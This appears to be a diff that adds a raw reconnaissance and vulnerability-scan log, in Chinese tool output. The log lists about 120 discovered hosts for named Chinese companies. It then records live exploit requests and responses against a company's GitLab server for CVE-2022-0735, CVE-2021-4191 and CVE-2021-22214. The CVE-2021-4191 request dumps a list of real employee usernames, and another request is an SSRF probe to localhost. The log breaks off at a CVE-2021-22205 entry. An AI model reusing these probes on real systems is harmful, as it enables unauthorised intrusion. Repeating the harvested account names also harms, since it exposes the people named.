@@ -1,0 +1,2584 @@
+[+] 本次搜索关键字为：domain="hzyoucon.com" || domain="zbxinmeiti.com" || domain="hosad.com" || domain="zimocloud.com" || domain="keyuchat.com" || domain="zj-hiwe.com" || domain="sinoma-zcdri.cn" || domain="cnheader.com" || domain="kuntaimaglev.cn" || domain="czgwl.cn" || domain="康诺环境.网址" || domain="wlintel.com" || domain="yunqiandou.com" || domain="zczxjl.com" || domain="keyland.com.cn" || domain="wuchancaiwu.com" || domain="domexcorp.com" || domain="hzcbs.com" || domain="wintechchina.com" || domain="hzcnde.com"
+http://hzcnde.com              301MovedPermanently        中国, Chengdu
+https://oa.sinoma-zcdri.cn     HTTPS                      中国, Shaoxing
+http://oa.sinoma-zcdri.cn      OA办公系统-浙江中材        中国, Shaoxing
+https://hzcnde.com             301MovedPermanently        中国, Chengdu
+https://www.hzcnde.com         无线测温装置-温湿度控制器-开关柜智能操控装置-高压带电显示器-数显多功能电力仪表-超耐德科技 中国, Chengdu
+http://www.hzcbs.com           杭州出版社                 中国, Hangzhou
+http://www.wintechchina.com    浙江云天集团有限公司       中国, Hangzhou
+https://dz.yunqiandou.com      HTTPS                      中国, Hangzhou
+http://dz.yunqiandou.com       HTTP                       中国, Hangzhou
+http://cdn.keyland.com.cn      403Forbidden               中国, Shanghai
+tls://api-jqq.zimocloud.com:9093 TLS                        中国, Hangzhou
+https://www.zczxjl.com         杭州众诚咨询监理有限公司   中国, Hangzhou
+http://www.zczxjl.com          杭州众诚咨询监理有限公司   中国, Hangzhou
+http://hzcbs.com               杭州出版社                 中国, Hangzhou
+https://www.yunqiandou.com     爱才云千斗共享经济平台     中国, Hangzhou
+http://www.yunqiandou.com      爱才云千斗共享经济平台     中国, Hangzhou
+rdp://www.zimocloud.com:3389   RDP                        中国, Hangzhou
+ssh://zczxjl.com:22            SSH                        中国, Shanghai
+https://cdn.keyland.com.cn     403Forbidden               中国, Foshan
+http://www.hzcnde.com          无线测温装置-温湿度控制器-开关柜智能操控装置-高压带电显示器-数显多功能电力仪表-超耐德科技 中国, Chengdu
+https://www.keyuchat.com       _首页                      新加坡, Singapore
+http://www.zj-hiwe.com         杭州家庭影院，杭州智能家居，艾维智能影音【官网】 中国香港特别行政区, Hong Kong
+https://zj-hiwe.com            杭州家庭影院，杭州智能家居，艾维智能影音【官网】 中国香港特别行政区, Hong Kong
+https://www.zj-hiwe.com        杭州家庭影院，杭州智能家居，艾维智能影音【官网】 中国香港特别行政区, Hong Kong
+https://agent.zimocloud.com    全游代理商平台             中国, Hangzhou
+https://celg.yunqiandou.com    HTTPS                      中国, Hangzhou
+http://celg.yunqiandou.com     403Forbidden               中国, Hangzhou
+https://wap.api.yunqiandou.com 403Forbidden               中国, Hangzhou
+https://api.yunqiandou.com     WelcometoCentOS            中国, Hangzhou
+http://wap.api.yunqiandou.com  WelcometoCentOS            中国, Hangzhou
+http://api.yunqiandou.com      WelcometoCentOS            中国, Hangzhou
+https://test.wap.api.yunqiandou.com 403Forbidden               中国, Hangzhou
+http://test.wap.api.yunqiandou.com 403Forbidden               中国, Hangzhou
+http://ai.zczxjl.com:8090      301MovedPermanently        中国, Jiaxing
+http://ai.zczxjl.com:8090      HTTP                       中国, Jiaxing
+https://www.hosad.com          HTTPS                      中国, Hangzhou
+http://www.hosad.com           HTTP                       中国, Hangzhou
+https://mp.keyland.com.cn      AntDesignPro               中国, Hangzhou
+http://mp.keyland.com.cn       HTTP                       中国, Hangzhou
+https://www.zimocloud.com      全游云电脑                 中国, Hangzhou
+http://www.zimocloud.com       全游云电脑                 中国, Hangzhou
+https://admin.keyland.com.cn   HTTPS                      中国, Hangzhou
+http://admin.keyland.com.cn    HTTP                       中国, Hangzhou
+http://api-jqq.zimocloud.com:443 HTTP                       中国, Hangzhou
+http://api.open.yunqiandou.com 301MovedPermanently        中国, Hangzhou
+https://api.open.yunqiandou.com 301MovedPermanently        中国, Hangzhou
+https://hzja.zczxjl.com:8443   交通设施管理系统           中国, Jiaxing
+http://sandtest.yunqiandou.com HTTP                       中国, Hangzhou
+http://benben.yunqiandou.com   301MovedPermanently        中国, Beijing
+https://sandtest.yunqiandou.com Signin·GitLab              中国, Hangzhou
+https://benben.yunqiandou.com  HTTPS                      中国, Beijing
+https://m.zczxjl.com           杭州众诚咨询监理有限公司   中国, Hangzhou
+http://fruit-dev.zczxjl.com    403Forbidden               中国, Hangzhou
+http://m.zczxjl.com            杭州众诚咨询监理有限公司   中国, Hangzhou
+https://fruit-dev.zczxjl.com   403Forbidden               中国, Hangzhou
+http://dc091950-703a-41a7-bf33-7633a79221e5.hzyoucon.com 333体育|电竞-官方网站      中国香港特别行政区, Hong Kong
+http://share.hzyoucon.com      333体育|电竞-官方网站      中国香港特别行政区, Hong Kong
+http://wwww.hzyoucon.com       333体育|电竞-官方网站      中国香港特别行政区, Hong Kong
+http://shuiwu.hzyoucon.com     333体育|电竞-官方网站      中国香港特别行政区, Hong Kong
+http://mail.hzyoucon.com       333体育|电竞-官方网站      中国香港特别行政区, Hong Kong
+http://bbs.hzyoucon.com        333体育|电竞-官方网站      中国香港特别行政区, Hong Kong
+http://3g.hzyoucon.com         333体育|电竞-官方网站      中国香港特别行政区, Hong Kong
+http://9599.hzyoucon.com       333体育|电竞-官方网站      中国香港特别行政区, Hong Kong
+http://www.share.hzyoucon.com  333体育|电竞-官方网站      中国香港特别行政区, Hong Kong
+http://69c2e181-02fe-4a85-9fe1-c5969f2b8cf8.hzyoucon.com 333体育|电竞-官方网站      中国香港特别行政区, Hong Kong
+http://www.hzyoucon.com        333体育|电竞-官方网站      中国香港特别行政区, Hong Kong
+http://rmqwn3g.hzyoucon.com    333体育|电竞-官方网站      中国香港特别行政区, Hong Kong
+http://4www.hzyoucon.com       333体育|电竞-官方网站      中国香港特别行政区, Hong Kong
+l2tpv2://ai.zczxjl.com:1701    L2TPV2                     中国, Jiaxing
+unknown://www.hzcbs.com:9530   UNKNOWN                    中国, Hangzhou
+unknown://hzcbs.com:9530       UNKNOWN                    中国, Hangzhou
+http://9599.hzyoucon.com       HTTP                       中国香港特别行政区, Hong Kong
+http://wwww.hzyoucon.com       HTTP                       中国香港特别行政区, Hong Kong
+http://rmqwn3g.hzyoucon.com    HTTP                       中国香港特别行政区, Hong Kong
+http://share.hzyoucon.com      HTTP                       中国香港特别行政区, Hong Kong
+http://dc091950-703a-41a7-bf33-7633a79221e5.hzyoucon.com HTTP                       中国香港特别行政区, Hong Kong
+http://www.share.hzyoucon.com  HTTP                       中国香港特别行政区, Hong Kong
+http://mail.hzyoucon.com       HTTP                       中国香港特别行政区, Hong Kong
+http://www.hzyoucon.com        HTTP                       中国香港特别行政区, Hong Kong
+http://69c2e181-02fe-4a85-9fe1-c5969f2b8cf8.hzyoucon.com HTTP                       中国香港特别行政区, Hong Kong
+http://3g.hzyoucon.com         HTTP                       中国香港特别行政区, Hong Kong
+http://shuiwu.hzyoucon.com     HTTP                       中国香港特别行政区, Hong Kong
+http://bbs.hzyoucon.com        HTTP                       中国香港特别行政区, Hong Kong
+http://4www.hzyoucon.com       HTTP                       中国香港特别行政区, Hong Kong
+https://zczxjl.com             KoolHouse                  中国, Shanghai
+http://zczxjl.com              KoolHouse                  中国, Shanghai
+http://dh-api.keyuchat.com     杭州藏春                   中国, Hangzhou
+https://dh-api.keyuchat.com    502BadGateway              中国, Hangzhou
+http://www.yunqiandou.com:8889 HTTP                       中国, Hangzhou
+https://pm-dev.zczxjl.com      监理管理系统               中国, Hangzhou
+https://olo-dev.zczxjl.com     302Found                   中国, Hangzhou
+http://olo-dev.zczxjl.com      302Found                   中国, Hangzhou
+http://t-api.jqq.zimocloud.com 302Found                   中国, Hangzhou
+https://mail.kuntaimaglev.cn   404NotFound                中国, Huizhou
+http://mail.kuntaimaglev.cn    404NotFound                中国, Guangzhou
+https://a.hosad.com            博客单点登录系统           中国, Hangzhou
+http://a.hosad.com             yzh博客管理系统            中国, Hangzhou
+http://prod.dz.yunqiandou.com  没有找到站点               中国, Hangzhou
+http://sand.yunqiandou.com     爱才集团（中国）有限公司_服务外包_人才招聘_人事代理 中国, Hangzhou
+https://sandtax.yunqiandou.com Signin·GitLab              中国, Hangzhou
+https://weixin.yunqiandou.com  Signin·GitLab              中国, Hangzhou
+https://sandadmin.yunqiandou.com Signin·GitLab              中国, Hangzhou
+http://sandtax.yunqiandou.com  数据平台                   中国, Hangzhou
+https://dz.xbz.yunqiandou.com  HTTPS                      中国, Hangzhou
+https://wap.api.xbz.yunqiandou.com WelcometoCentOS            中国, Hangzhou
+http://qyg.admin.yunqiandou.com 巧用工后台管理系统         中国, Hangzhou
+http://dz.xbz.yunqiandou.com   WelcometoCentOS            中国, Hangzhou
+http://admin.xbz.yunqiandou.com WelcometoCentOS            中国, Hangzhou
+https://admin.yunqiandou.com   HTTPS                      中国, Hangzhou
+https://sand.yunqiandou.com    Signin·GitLab              中国, Hangzhou
+https://admin.xbz.yunqiandou.com HTTPS                      中国, Hangzhou
+https://tax.yunqiandou.com     HTTPS                      中国, Hangzhou
+http://tax.yunqiandou.com      数据平台                   中国, Hangzhou
+http://weixin.yunqiandou.com   WelcometoCentOS            中国, Hangzhou
+http://admin.yunqiandou.com    千斗灵工后台管理系统       中国, Hangzhou
+http://sandadmin.yunqiandou.com 千斗灵工后台管理系统       中国, Hangzhou
+http://wap.api.xbz.yunqiandou.com WelcometoCentOS            中国, Hangzhou
+http://qyg.yunqiandou.com      巧用工科技平台             中国, Hangzhou
+http://test.api.yunqiandou.com WelcometoCentOS            中国, Hangzhou
+ssh://prod.dz.yunqiandou.com:22 SSH                        中国, Hangzhou
+[+] 本次搜索，返回结果总条数为：120,此次返回条数为：120
+https://www.hzcnde.com                   🤓 53客服
+http://www.hzcbs.com                     🤓 haohan
+https://dz.yunqiandou.com                🤓 
+http://www.wintechchina.com              🤓 xinjingxiang
+http://dz.yunqiandou.com                 🤓 
+http://oa.sinoma-zcdri.cn                🤓 ASP;IIS
+https://www.zczxjl.com                   🤓 Bootstrap
+http://cdn.keyland.com.cn                🤓 
+http://www.zczxjl.com                    🤓 Bootstrap
+https://hzcnde.com                       🤓 53客服
+https://www.yunqiandou.com               🤓 
+http://www.yunqiandou.com                🤓 
+http://hzcbs.com                         🤓 haohan
+http://hzcnde.com                        🤓 53客服
+https://cdn.keyland.com.cn               🤓 
+http://www.hzcnde.com                    🤓 53客服
+http://celg.yunqiandou.com               🤓 
+https://www.keyuchat.com                 🤓 
+https://celg.yunqiandou.com              🤓 
+http://wap.api.yunqiandou.com            🤓 CentOS 默认页面
+https://wap.api.yunqiandou.com           🤓 
+https://api.yunqiandou.com               🤓 CentOS 默认页面
+http://api.yunqiandou.com                🤓 CentOS 默认页面
+https://test.wap.api.yunqiandou.com      🤓 
+http://test.wap.api.yunqiandou.com       🤓 
+http://www.zj-hiwe.com                   🤓 
+https://www.zj-hiwe.com                  🤓 
+https://mp.keyland.com.cn                🤓 Nodejs
+https://zj-hiwe.com                      🤓 
+http://mp.keyland.com.cn                 🤓 Nodejs
+http://www.hosad.com                     🤓 宝塔-BT.cn
+https://admin.keyland.com.cn             🤓 Nodejs
+http://admin.keyland.com.cn              🤓 Nodejs
+https://www.hosad.com                    🤓 
+http://sandtest.yunqiandou.com           🤓 
+http://api.open.yunqiandou.com           🤓 
+https://api.open.yunqiandou.com          🤓 
+https://sandtest.yunqiandou.com          🤓 Redmine;gitlab;Ruby;rails-framework
+https://benben.yunqiandou.com            🤓 Echarts
+https://hzja.zczxjl.com:8443             🤓 
+https://m.zczxjl.com                     🤓 
+http://fruit-dev.zczxjl.com              🤓 
+http://benben.yunqiandou.com             🤓 Echarts
+http://m.zczxjl.com                      🤓 
+https://fruit-dev.zczxjl.com             🤓 
+http://www.yunqiandou.com:8889           🤓 fastjson;springboot
+http://t-api.jqq.zimocloud.com           🤓 
+https://olo-dev.zczxjl.com               🤓 
+http://olo-dev.zczxjl.com                🤓 
+https://pm-dev.zczxjl.com                🤓 
+https://mail.kuntaimaglev.cn             🤓 AccVisio
+http://sand.yunqiandou.com               🤓 
+http://mail.kuntaimaglev.cn              🤓 Tencent-Exmail;腾讯企业邮箱;lianwo168-Router;quarkmail;AccVisio
+https://sandtax.yunqiandou.com           🤓 Redmine;gitlab;Ruby;rails-framework
+https://weixin.yunqiandou.com            🤓 Redmine;gitlab;Ruby;rails-framework
+http://sandtax.yunqiandou.com            🤓 
+http://dz.xbz.yunqiandou.com             🤓 CentOS 默认页面
+http://qyg.admin.yunqiandou.com          🤓 
+https://sandadmin.yunqiandou.com         🤓 Redmine;gitlab;Ruby;rails-framework
+http://admin.xbz.yunqiandou.com          🤓 CentOS 默认页面
+https://wap.api.xbz.yunqiandou.com       🤓 CentOS 默认页面
+http://tax.yunqiandou.com                🤓 
+https://dz.xbz.yunqiandou.com            🤓 
+https://admin.yunqiandou.com             🤓 
+https://admin.xbz.yunqiandou.com         🤓 
+https://tax.yunqiandou.com               🤓 
+http://test.api.yunqiandou.com           🤓 CentOS 默认页面
+http://weixin.yunqiandou.com             🤓 CentOS 默认页面
+http://qyg.yunqiandou.com                🤓 
+http://sandadmin.yunqiandou.com          🤓 
+https://sand.yunqiandou.com              🤓 Redmine;gitlab;Ruby;rails-framework
+http://admin.yunqiandou.com              🤓 
+http://wap.api.xbz.yunqiandou.com        🤓 CentOS 默认页面
+[vuln] [critical] [CVE-2022-0735] https://sandtest.yunqiandou.com/users/sign_in
+================  请求数据包 ================
+GET /users/sign_in HTTP/1.1
+Host: sandtest.yunqiandou.com
+User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+================  请求响应包 ================
+HTTP/1.1 200 OK
+Connection: close
+Transfer-Encoding: chunked
+Cache-Control: max-age=0, private, must-revalidate
+Content-Type: text/html; charset=utf-8
+Date: Thu, 26 Mar 2026 06:17:30 GMT
+Etag: W/"c6b616fe2f52b72aba6587874e3c55c8"
+Referrer-Policy: strict-origin-when-cross-origin
+Server: nginx
+Set-Cookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkltSmpPREpoT1RjekxUaGtOREF0TkdWaU5DMDVZVE5tTFRVM1pESXpNVGxoTkdFMVl5ST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--b63f85ebc48ac4e2b32ae2891f7f5d275dc5e912; path=/; expires=Mon, 26 Mar 2046 06:17:30 -0000; secure; HttpOnly; SameSite=None
+Set-Cookie: _gitlab_session=beb6dc75105c65235f0eb692b1e9081d; path=/; expires=Thu, 26 Mar 2026 08:17:30 -0000; secure; HttpOnly; SameSite=None
+X-Content-Type-Options: nosniff
+X-Download-Options: noopen
+X-Frame-Options: DENY
+X-Permitted-Cross-Domain-Policies: none
+X-Request-Id: mwB5RkMchT6
+X-Runtime: 0.031912
+X-Ua-Compatible: IE=edge
+X-Xss-Protection: 1; mode=block
+
+<!DOCTYPE html>
+<html class="devise-layout-html">
+<head prefix="og: http://ogp.me/ns#">
+<meta charset="utf-8">
+<meta content="IE=edge" http-equiv="X-UA-Compatible">
+<meta content="object" property="og:type">
+<meta content="GitLab" property="og:site_name">
+<meta content="Sign in" property="og:title">
+<meta content="GitLab Community Edition" property="og:description">
+<meta content="https://sandtest.yunqiandou.com/assets/gitlab_logo-7ae504fe4f68fdebb3c2034e36621930cd36ea87924c11ff65dbcb8ed50dca58.png" property="og:image">
+<meta content="64" property="og:image:width">
+<meta content="64" property="og:image:height">
+<meta content="https://sandtest.yunqiandou.com/users/sign_in" property="og:url">
+<meta content="summary" property="twitter:card">
+<meta content="Sign in" property="twitter:title">
+<meta content="GitLab Community Edition" property="twitter:description">
+<meta content="https://sandtest.yunqiandou.com/assets/gitlab_logo-7ae504fe4f68fdebb3c2034e36621930cd36ea87924c11ff65dbcb8ed50dca58.png" property="twitter:image">
+
+<title>Sign in · GitLab</title>
+<meta content="GitLab Community Edition" name="description">
+<link rel="shortcut icon" type="image/png" href="/assets/favicon-7901bd695fb93edb07975966062049829afb56cf11511236e61bcf425070e36e.png" id="favicon" data-original-href="/assets/favicon-7901bd695fb93edb07975966062049829afb56cf11511236e61bcf425070e36e.png" />
+<link rel="stylesheet" media="all" href="/assets/application-4abc4e078df94075056919bd59aed6e7a0f95067039a8339b8f614924d8cb160.css" />
+<link rel="stylesheet" media="print" href="/assets/print-74c3df10dad473d66660c828e3aa54ca3bfeac6d8bb708643331403fe7211e60.css" />
+
+
+<link rel="stylesheet" media="all" href="/assets/highlight/themes/white-aa541d93e094b4420ea8e2dcd8e2ee99bb24ef1010bbbd20d427b1f9c54d42da.css" />
+<script>
+//<![CDATA[
+window.gon={};
+//]]>
+</script>
+
+
+<script src="/assets/webpack/runtime.dd9905d6.bundle.js" defer="defer"></script>
+<script src="/assets/webpack/main.4ff6e187.chunk.js" defer="defer"></script>
+<script src="/assets/webpack/commons~pages.admin.sessions~pages.ldap.omniauth_callbacks~pages.omniauth_callbacks~pages.profiles.t~f07ce35f.a6d33088.chunk.js" defer="defer"></script>
+<script src="/assets/webpack/pages.sessions.new.6586209e.chunk.js" defer="defer"></script>
+
+<meta name="csrf-param" content="authenticity_token" />
+<meta name="csrf-token" content="ESAQX+75ac9Gw5zBoa7tq3Hj1oe3MjWFcZ+j8ikvU7nUZKiMGRBYkuo9BlEVw0dxtxBvK1zZZGrH/EM3cbyJOg==" />
+
+<meta name="action-cable-url" content="/-/cable" />
+<meta content="origin-when-cross-origin" name="referrer">
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="#474D57" name="theme-color">
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-iphone-5a9cee0e8a51212e70b90c87c12f382c428870c0ff67d1eb034d884b78d2dae7.png" />
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-ipad-a6eec6aeb9da138e507593b464fdac213047e49d3093fc30e90d9a995df83ba3.png" sizes="76x76" />
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-iphone-retina-72e2aadf86513a56e050e7f0f2355deaa19cc17ed97bbe5147847f2748e5a3e3.png" sizes="120x120" />
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-ipad-retina-8ebe416f5313483d9c1bc772b5bbe03ecad52a54eba443e5215a22caed2a16a2.png" sizes="152x152" />
+<link color="rgb(226, 67, 41)" href="/assets/logo-d36b5212042cebc89b96df4bf6ac24e43db316143e89926c0db839ff694d2de4.svg" rel="mask-icon">
+<meta content="/assets/msapplication-tile-1196ec67452f618d39cdd85e2e3a542f76574c071051ae7effbfde01710eb17d.png" name="msapplication-TileImage">
+<meta content="#30353E" name="msapplication-TileColor">
+
+
+
+
+</head>
+
+<body class="application gl-browser-chrome gl-platform-chrome_os login-page navless ui-indigo" data-page="sessions:new" data-qa-selector="login_page">
+
+<script>
+//<![CDATA[
+gl = window.gl || {};
+gl.client = {"isChrome":true,"isChrome Os":true};
+
+
+//]]>
+</script>
+<div class="page-wrap">
+<header class="navbar fixed-top navbar-empty">
+<svg width="24" height="24" class="tanuki-logo" viewBox="0 0 36 36">
+  <path class="tanuki-shape tanuki-left-ear" fill="#e24329" d="M2 14l9.38 9v-9l-4-12.28c-.205-.632-1.176-.632-1.38 0z"/>
+  <path class="tanuki-shape tanuki-right-ear" fill="#e24329" d="M34 14l-9.38 9v-9l4-12.28c.205-.632 1.176-.632 1.38 0z"/>
+  <path class="tanuki-shape tanuki-nose" fill="#e24329" d="M18,34.38 3,14 33,14 Z"/>
+  <path class="tanuki-shape tanuki-left-eye" fill="#fc6d26" d="M18,34.38 11.38,14 2,14 6,25Z"/>
+  <path class="tanuki-shape tanuki-right-eye" fill="#fc6d26" d="M18,34.38 24.62,14 34,14 30,25Z"/>
+  <path class="tanuki-shape tanuki-left-cheek" fill="#fca326" d="M2 14L.1 20.16c-.18.565 0 1.2.5 1.56l17.42 12.66z"/>
+  <path class="tanuki-shape tanuki-right-cheek" fill="#fca326" d="M34 14l1.9 6.16c.18.565 0 1.2-.5 1.56L18 34.38z"/>
+</svg>
+
+</header>
+
+<div class="login-page-broadcast">
+
+
+</div>
+<div class="container navless-container">
+<div class="content">
+<div class="flash-container flash-container-page sticky">
+</div>
+
+<div class="row mt-3">
+<div class="col-sm-12">
+<h1 class="mb-3 font-weight-normal">
+GitLab Community Edition
+</h1>
+</div>
+</div>
+<div class="row mb-3">
+<div class="col-sm-7 order-12 order-sm-1 brand-holder">
+
+<h3 class="mt-sm-0">
+A complete DevOps platform
+</h3>
+<p>
+GitLab is a single application for the entire software development lifecycle. From project planning and source code management to CI/CD, monitoring, and security.
+</p>
+
+</div>
+<div class="col-sm-5 order-1 order-sm-12 new-session-forms-container">
+<div id="signin-container">
+<ul class="nav-links new-session-tabs nav-tabs nav" role="tablist">
+<li class="nav-item" role="presentation">
+<a class="nav-link active" data-qa-selector="sign_in_tab" data-toggle="tab" href="#login-pane" role="tab">Sign in</a>
+</li>
+</ul>
+
+<div class="tab-content">
+<div class="login-box tab-pane active" id="login-pane" role="tabpanel">
+<div class="login-body">
+<form class="new_user gl-show-field-errors" id="new_user" aria-live="assertive" action="/users/sign_in" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="&#x2713;" /><input type="hidden" name="authenticity_token" value="gcLtsw5gPlT2viAgQjxVBpEhAWgfUHmGq9L4kN8Vx5ZEhlVg+YkPCVpAurD2Uf/cV9K4xPS7KGkdsRhVh4YdFQ==" /><div class="form-group">
+<label for="user_login" class="label-bold">Username or email</label>
+<input class="form-control top" autofocus="autofocus" autocapitalize="off" autocorrect="off" required="required" title="This field is required." data-qa-selector="login_field" type="text" name="user[login]" id="user_login" />
+</div>
+<div class="form-group">
+<label class="label-bold" for="user_password">Password</label>
+<input class="form-control bottom" required="required" title="This field is required." data-qa-selector="password_field" type="password" name="user[password]" id="user_password" />
+</div>
+<div class="remember-me">
+<label for="user_remember_me">
+<input name="user[remember_me]" type="hidden" value="0" /><input class="remember-me-checkbox" type="checkbox" value="1" name="user[remember_me]" id="user_remember_me" />
+<span>Remember me</span>
+</label>
+<div class="float-right">
+<a href="/users/password/new">Forgot your password?</a>
+</div>
+</div>
+<div></div>
+<div class="submit-container move-submit-down">
+<input type="submit" name="commit" value="Sign in" class="btn btn-success" data-qa-selector="sign_in_button" data-disable-with="Sign in" />
+</div>
+</form>
+</div>
+</div>
+
+</div>
+</div>
+
+</div>
+</div>
+</div>
+</div>
+<hr class="footer-fixed">
+<div class="container footer-container">
+<div class="footer-links">
+<a href="/explore">Explore</a>
+<a href="/help">Help</a>
+<a href="https://about.gitlab.com/">About GitLab</a>
+</div>
+</div>
+
+</div>
+</body>
+</html>
+
+============================================
+[vuln] [medium] [CVE-2021-4191] https://sandtest.yunqiandou.com/api/graphql
+================  请求数据包 ================
+POST /api/graphql HTTP/1.1
+Host: sandtest.yunqiandou.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1.1 Safari/605.1.15
+Connection: close
+Content-Length: 917
+Accept: */*
+Content-Type: application/json
+Origin: https://sandtest.yunqiandou.com
+Referer: https://sandtest.yunqiandou.com/-/graphql-explorer
+Accept-Encoding: gzip
+
+{"query":"# Welcome to GraphiQL\n#\n# GraphiQL is an in-browser tool for writing, validating, and\n# testing GraphQL queries.\n#\n# Type queries into this side of the screen, and you will see intelligent\n# typeaheads aware of the current GraphQL type schema and live syntax and\n# validation errors highlighted within the text.\n#\n# GraphQL queries typically start with a \"{\" character. Lines that starts\n# with a # are ignored.\n#\n# An example GraphQL query might look like:\n#\n#     {\n#       field(arg: \"value\") {\n#         subField\n#       }\n#     }\n#\n# Keyboard shortcuts:\n#\n#  Prettify Query:  Shift-Ctrl-P (or press the prettify button above)\n#\n#       Run Query:  Ctrl-Enter (or press the play button above)\n#\n#   Auto Complete:  Ctrl-Space (or just start typing)\n#\n\n{\n  users {\n    nodes {\n      id\n      name\n      username\n    }\n  }\n}","variables":null,"operationName":null}
+================  请求响应包 ================
+HTTP/1.1 200 OK
+Connection: close
+Transfer-Encoding: chunked
+Access-Control-Allow-Methods: GET, HEAD, POST, PUT, PATCH, DELETE, OPTIONS
+Access-Control-Allow-Origin: *
+Access-Control-Expose-Headers: Link, X-Total, X-Total-Pages, X-Per-Page, X-Page, X-Next-Page, X-Prev-Page, X-Gitlab-Blob-Id, X-Gitlab-Commit-Id, X-Gitlab-Content-Sha256, X-Gitlab-Encoding, X-Gitlab-File-Name, X-Gitlab-File-Path, X-Gitlab-Last-Commit-Id, X-Gitlab-Ref, X-Gitlab-Size
+Access-Control-Max-Age: 7200
+Cache-Control: max-age=0, private, must-revalidate
+Content-Type: application/json; charset=utf-8
+Date: Thu, 26 Mar 2026 06:17:31 GMT
+Etag: W/"ad332e571214fbf41c3f91b90d7adc9c"
+Referrer-Policy: strict-origin-when-cross-origin
+Server: nginx
+Vary: Origin
+X-Content-Type-Options: nosniff
+X-Download-Options: noopen
+X-Frame-Options: DENY
+X-Permitted-Cross-Domain-Policies: none
+X-Request-Id: DwQWEDm2Eoa
+X-Runtime: 0.051910
+X-Ua-Compatible: IE=edge
+X-Xss-Protection: 1; mode=block
+
+{"data":{"users":{"nodes":[{"id":"gid://gitlab/User/65","name":"GitLab Alert Bot","username":"alert-bot"},{"id":"gid://gitlab/User/64","name":"zhanglijuan","username":"zhanglijuan"},{"id":"gid://gitlab/User/62","name":"yangwanli","username":"yangwanli"},{"id":"gid://gitlab/User/61","name":"wuwenyu","username":"wuwenyu"},{"id":"gid://gitlab/User/60","name":"tongmiao","username":"tongmiao"},{"id":"gid://gitlab/User/59","name":"lwj","username":"lwj"},{"id":"gid://gitlab/User/58","name":"gzt","username":"gzt"},{"id":"gid://gitlab/User/57","name":"wanglinyang","username":"wanglinyang"},{"id":"gid://gitlab/User/56","name":"hanshuai","username":"hanshuai"},{"id":"gid://gitlab/User/55","name":"heyi","username":"heyi"},{"id":"gid://gitlab/User/54","name":"meijie","username":"meijie"},{"id":"gid://gitlab/User/53","name":"lixin","username":"lixin"},{"id":"gid://gitlab/User/52","name":"zbf","username":"zbf"},{"id":"gid://gitlab/User/51","name":"liangdongdong","username":"liangdongdong"},{"id":"gid://gitlab/User/50","name":"chenwenxing","username":"chenwenxing"},{"id":"gid://gitlab/User/45","name":"wufan","username":"spirit-wufan"},{"id":"gid://gitlab/User/41","name":"jzk","username":"jzk"},{"id":"gid://gitlab/User/40","name":"zhoutianhui","username":"zhoutianhui"},{"id":"gid://gitlab/User/36","name":"黄政阳","username":"hzy"},{"id":"gid://gitlab/User/34","name":"zhouquanbo","username":"zhouquanbo"},{"id":"gid://gitlab/User/33","name":"ls","username":"ls"},{"id":"gid://gitlab/User/31","name":"9GphYZYkxe","username":"9GphYZYkxe"},{"id":"gid://gitlab/User/30","name":"zhangwei","username":"zhangwei"},{"id":"gid://gitlab/User/29","name":"chenkang@aicaihr.com","username":"chenkang"},{"id":"gid://gitlab/User/27","name":"lijiaxin","username":"lijiaxin"},{"id":"gid://gitlab/User/26","name":"heajing","username":"heajing"},{"id":"gid://gitlab/User/25","name":"yuxinyu","username":"yuxinyu"},{"id":"gid://gitlab/User/24","name":"fxl","username":"fxl"},{"id":"gid://gitlab/User/19","name":"songfeihu","username":"songfeihu"},{"id":"gid://gitlab/User/16","name":"chenyifan","username":"chenyifan"},{"id":"gid://gitlab/User/14","name":"xiaqi","username":"xiaqi"},{"id":"gid://gitlab/User/13","name":"tianmaoshan","username":"tianmaoshan"},{"id":"gid://gitlab/User/9","name":"chenpengfei","username":"chenpengfei"},{"id":"gid://gitlab/User/5","name":"Ghost User","username":"ghost"},{"id":"gid://gitlab/User/3","name":"liuyuhong","username":"lyh"},{"id":"gid://gitlab/User/2","name":"maxuefeng","username":"maxuefeng"},{"id":"gid://gitlab/User/1","name":"Administrator","username":"root"}]}}}
+[vuln] [high] [CVE-2021-22214] https://sandtest.yunqiandou.com/api/v4/ci/lint?include_merged_yaml=true
+============================================
+================  请求数据包 ================
+POST /api/v4/ci/lint?include_merged_yaml=true HTTP/1.1
+Host: sandtest.yunqiandou.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
+Connection: close
+Content-Length: 67
+Accept: */*
+Accept-Language: en
+Content-Type: application/json
+Accept-Encoding: gzip
+
+{"content": "include:\n  remote: http://127.0.0.1:9100/test.yml"}
+
+================  请求响应包 ================
+HTTP/1.1 200 OK
+Connection: close
+Content-Length: 113
+Cache-Control: max-age=0, private, must-revalidate
+Content-Type: application/json
+Date: Thu, 26 Mar 2026 06:17:31 GMT
+Etag: W/"b635f94e9dd628f1735099bfbf852052"
+Server: nginx
+Vary: Origin
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+X-Request-Id: D755YmX9Tr2
+X-Runtime: 0.032310
+
+{"status":"invalid","errors":["Included file `http://127.0.0.1:9100/test.yml` does not have valid YAML syntax!"]}
+============================================
+[vuln] [critical] [CVE-2021-22205] https://sandtest.yunqiandou.com/users/sign_in
+================  请求数据包 ================
+GET /users/sign_in HTTP/1.1
+Host: sandtest.yunqiandou.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+================  请求响应包 ================
